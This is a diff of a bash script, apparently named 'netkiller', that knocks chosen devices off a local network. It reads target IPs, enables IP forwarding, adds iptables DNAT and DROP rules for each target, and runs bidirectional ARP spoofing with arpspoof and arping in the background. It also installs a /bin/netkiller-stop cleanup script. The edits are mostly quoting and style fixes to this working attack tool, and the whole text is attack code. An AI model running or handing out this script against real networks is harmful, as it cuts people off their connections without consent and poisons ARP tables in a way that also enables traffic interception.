@@ -72,7 +72,7 @@ done
 # Detect network
 WLAN=$(ip link show | awk -F': ' '/^[0-9]+: wl/{print $2}' | head -n 1)
 GW=$(ip route show dev "$WLAN" | awk '/default/ {print $3}')
-MYIP=$(ip addr show $WLAN | awk '/inet / {print $2}' | cut -d/ -f1)
+MYIP=$(ip addr show "$WLAN" | awk '/inet / {print $2}' | cut -d/ -f1)
 
 echo ""
 echo "Current Network Information"
@@ -83,12 +83,12 @@ echo ""
 
 # Get user input
 echo "Enter network interface (e.g., $WLAN): Enter to skip"
-read -p "> $WLAN " WLN
+read -r -p "> $WLAN " WLN
 INTERFACE="${WLN:-$WLAN}"
 echo ""
 
 echo "Enter the Gateway IP: Enter to skip"
-read -p "> $GW " INET
+read -r -p "> $GW " INET
 GATEWAY="${INET:-$GW}"
 echo ""
 
@@ -97,7 +97,7 @@ DEVICE_IP="$MYIP"
 echo ""
 
 echo "Enter target IP (e.g 10.0.0.10 10.0.0.20 or 10.0.0.1/20)"
-read -p "> " TARGET_INPUT
+read -r -p "> " TARGET_INPUT
 echo ""
 
 echo "Target Device IP"
@@ -148,7 +148,7 @@ if [ ${#TARGETS[@]} -eq 0 ]; then
     exit 1
 fi
 
-echo "Target IPs to block: ${TARGETS[@]}"
+echo "Target IPs to block: ${TARGETS[*]}"
 
 # Enable IP forwarding
 echo 1 > /proc/sys/net/ipv4/ip_forward
@@ -156,19 +156,17 @@ echo 1 > /proc/sys/net/ipv4/ip_forward
 # Block all of the target packets for each target
 for TARGET in "${TARGETS[@]}"; do
     echo "Blocking $TARGET..."
+    sudo iptables -P FORWARD DROP
+    sudo iptables -t nat -A PREROUTING -s "$TARGET" -j DNAT --to-destination "$GATEWAY"
+    sudo iptables -t nat -A PREROUTING -d "$TARGET" -j DNAT --to-destination "$GATEWAY"
+    sudo iptables -A FORWARD -s "$TARGET" -j DROP
+    sudo iptables -A FORWARD -d "$TARGET" -j DROP
 
-        sudo iptables -P FORWARD DROP
-        sudo iptables -t nat -A PREROUTING -s "$TARGET" -j DNAT --to-destination "$GATEWAY"
-        sudo iptables -t nat -A PREROUTING -d "$TARGET" -j DNAT --to-destination "$GATEWAY"
-        sudo iptables -A FORWARD -s "$TARGET" -j DROP
-        sudo iptables -A FORWARD -d "$TARGET" -j DROP
-     
-       # Bidirectional ARP Spoofing
-       (
-        sudo arpspoof -i "$INTERFACE" -t "$TARGET" "$GATEWAY" >/dev/null 2>&1 &
-        sudo arpspoof -i "$INTERFACE" -t "$GATEWAY" "$TARGET" >/dev/null 2>&1 &
-        sudo arping -b -A -i "$INTERFACE" -S "$TARGET" "$GATEWAY" >/dev/null 2>&1 &
-       ) &
+    # Bidirectional ARP Spoofing
+    (
+        arpspoof -i "$INTERFACE" -t "$TARGET" -r "$GATEWAY" >/dev/null 2>&1 &
+        arping -b -A -i "$INTERFACE" -S "$TARGET" "$GATEWAY" >/dev/null 2>&1 &
+    ) &
 done
 
 echo ""
@@ -177,17 +175,22 @@ echo "Blocking rules applied."
 # Cleanup function
 cat > /bin/netkiller-stop << EOF
 #!/bin/bash
+
+echo ""
 echo "Unblocking the Device..."
     # Flush arp tables
-    sudo ip -s -s neigh flush all
+    ip -s -s neigh flush all >/dev/null 2>&1
     # Kill all arpspoof processes
-    sudo pkill -f arping
-    sudo pkill -f arpspoof
+    pkill -f arping
+    pkill -f arpspoof
     # Flush iptables rules
-    sudo iptables -F FORWARD
-    sudo iptables -t nat -F
+    iptables -P FORWARD ACCEPT
+    iptables -F FORWARD
+    iptables -t nat -F
 sleep 2s
+echo ""
 echo "Done!"
+echo "Restoring the Connections..."
 EOF
 sudo chmod 755 /bin/netkiller-stop
 
